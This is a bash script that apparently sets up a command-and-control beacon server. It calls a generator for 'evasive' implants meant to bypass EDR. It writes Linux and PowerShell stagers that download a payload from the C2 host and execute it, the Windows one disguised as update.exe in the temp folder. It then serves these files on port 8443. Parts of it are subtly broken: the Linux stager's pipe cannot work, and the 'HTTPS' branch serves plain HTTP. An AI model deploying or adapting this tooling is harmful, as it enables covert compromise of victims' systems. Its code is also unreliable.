#!/bin/bash
# Beacon server script to host generated implants

# Configuration
BEACONS_DIR="/opt/beacons"
WEBSERVER_PORT=8443
CERTIFICATE="/etc/ssl/private/beacon-server.pem"
KEY="/etc/ssl/private/beacon-server.key"

# Set secure umask
umask 077

# Ensure beacons directory exists
mkdir -p $BEACONS_DIR

# Function to generate beacons using Sliver
# This will replace part of files/serve-beacons.sh
function generate_beacons() {
    echo "[+] Generating evasive beacons for all platforms..."
    
    # Use evasive beacon generator for better EDR bypass
    /opt/c2/generate_evasive_beacons.sh $C2_HOST 8443
    
    # Generate stagers
    echo "#!/bin/bash
curl -s $C2_HOST:8443/linux | chmod +x && ./linux" > $BEACONS_DIR/beacon.sh
    chmod +x $BEACONS_DIR/beacon.sh
    
    echo "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
\$url = 'http://$C2_HOST:8443/windows.exe';
\$outpath = \"\$env:TEMP\\update.exe\";
Invoke-WebRequest -Uri \$url -OutFile \$outpath;
Start-Process -NoNewWindow -FilePath \$outpath;" > $BEACONS_DIR/beacon.ps1
    
    echo "[+] All beacons generated successfully"
}

# Generate beacons
generate_beacons

# Serve beacons using Python's HTTP server (with SSL if certificate exists)
if [ -f "$CERTIFICATE" ] && [ -f "$KEY" ]; then
    echo "[+] Starting HTTPS server on port $WEBSERVER_PORT..."
    cd $BEACONS_DIR
    python3 -m http.server $WEBSERVER_PORT --bind 0.0.0.0 &
    SERVER_PID=$!
else
    echo "[+] Starting HTTP server on port $WEBSERVER_PORT..."
    cd $BEACONS_DIR
    python3 -m http.server $WEBSERVER_PORT --bind 0.0.0.0 &
    SERVER_PID=$!
fi

echo "[+] Beacon server started with PID $SERVER_PID"
echo "[+] Beacons available at http(s)://$C2_HOST:$WEBSERVER_PORT/"
echo "[+] Press Ctrl+C to stop the server"

# Keep script running and respond to Ctrl+C
trap "kill $SERVER_PID; echo '[+] Beacon server stopped'; exit 0" INT
while true; do sleep 1; done